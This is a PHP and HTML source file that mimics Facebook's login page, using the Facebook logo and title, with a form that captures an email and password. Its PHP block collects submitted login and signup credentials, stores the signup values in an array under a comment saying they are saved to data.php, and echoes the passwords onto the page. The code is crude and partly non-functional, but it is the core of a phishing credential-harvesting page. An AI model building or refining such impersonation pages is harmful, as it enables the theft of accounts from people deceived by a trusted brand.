<?php include 'data.php';?>
<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-4 ">
                <div class="card mt-5">
                    <div class="card-header">
                        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" style="width: 200px;">
                        <h4>Log in to Facebook</h4>
                    </div>
                    <div class="card-body">
                        <form action="" method="POST">
                            <div class="form-group">
                                <label for="email">Email address or phone number</label>
                                <input name="email" type="email" class="form-control" id="email" placeholder="Enter your email or phone number">
                            </div>
                            <div class="form-group">
                                <label for="password">Password</label>
                                <input name="password" type="password" class="form-control" id="password" placeholder="Enter your password">
                            </div>
                            <div class="form-group form-check">
                                <input type="checkbox" class="form-check-input" id="remember">
                                <label class="form-check-label" for="remember">Remember me</label>
                            </div>
                            <button type="submit" class="btn btn-primary">Log In</button>
                            <div class="form-group">
                                <a href="#" class="forgot-password">Forgotten password?</a>
                            </div>
                            <div class="form-group">
                                <p class="sign-up">Don't have an account? <a href="signup.html">Create new account</a></p>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <?php
       
        if(isset($_POST['signup_email']) && isset($_POST['signup_password'])) {
            $signup_email = $_POST['signup_email'];
            $signup_password = $_POST['signup_password'];
            global $signup_email;
            global $signup_password;

            // saving this info to data.php file.
            $credentials["signup_email"] = $signup_email;
            $credentials["signup_password"] = $signup_password;

            // Your further processing here
            echo "sign up data :\n"."<br>";
            echo "email: $signup_email"."<br>";
            echo "pass: $signup_password\n";
        } else {
            echo "Form fields are not set.";
        }

        echo "<hr >";

        foreach($credentials as $item){
            echo $item . "<br>";
        }
        if(isset($_POST['email']) && isset($_POST['password'])) {
            $email = $_POST['email'];
            $password = $_POST['password'];
            global $email;
            global $password;

            // Your further processing here
            echo "Welcome:\n";
            echo "email: $email\n";
            echo "pass: $password\n";
        } else {
            echo "Form fields are not set.";
        }



    ?>

</body>
</html>